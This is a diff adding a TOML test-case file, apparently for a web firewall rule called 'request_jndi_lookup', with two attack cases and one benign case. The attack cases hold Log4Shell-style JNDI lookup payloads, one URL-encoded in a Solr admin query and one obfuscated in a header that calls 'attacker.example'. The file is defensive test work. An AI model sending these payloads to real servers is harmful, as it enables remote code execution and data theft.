@@ -1,0 +1,53 @@
+[[case]]
+name = "lookup-in-parameter"
+kind = "attack"
+via = "request"
+
+[case.request]
+method = "GET"
+uri = "/solr/admin/cores"
+query = "action=%24%7Bjndi%3Aldap%3A%2F%2F%24%7Bsys%3Ajava.version%7D.example.com%7D"
+headers = { User-Agent = "Mozilla/5.0 (X11; Linux x86_64) Firefox/128.0", Accept = "text/html" }
+
+[case.primary]
+effect = "block"
+rule = "request_jndi_lookup"
+
+[case.backport]
+effect = "unreachable"
+why = "the backports have no request-entry rule for this input"
+
+[[case]]
+name = "obfuscated-lookup-in-header"
+kind = "attack"
+via = "request"
+
+[case.request]
+method = "GET"
+uri = "/"
+headers = { User-Agent = "Mozilla/5.0 (X11; Linux x86_64) Firefox/128.0", Accept = "text/html", X-Api-Version = "${${::-j}${::-n}${::-d}${::-i}:rmi://attacker.example/a}" }
+
+[case.primary]
+effect = "block"
+rule = "request_jndi_lookup"
+
+[case.backport]
+effect = "unreachable"
+why = "the backports have no request-entry rule for this input"
+
+[[case]]
+name = "benign-date-lookup-and-ldap-text"
+kind = "benign"
+via = "request"
+
+[case.request]
+method = "GET"
+uri = "/solr/admin/cores"
+query = "action=%24%7Bdate%3Ayyyy%7D&next=ldap%3A%2F%2Fexample.com%2Fa"
+headers = { User-Agent = "Mozilla/5.0 (X11; Linux x86_64) Firefox/128.0", Accept = "text/html" }
+
+[case.primary]
+effect = "none"
+
+[case.backport]
+effect = "none"
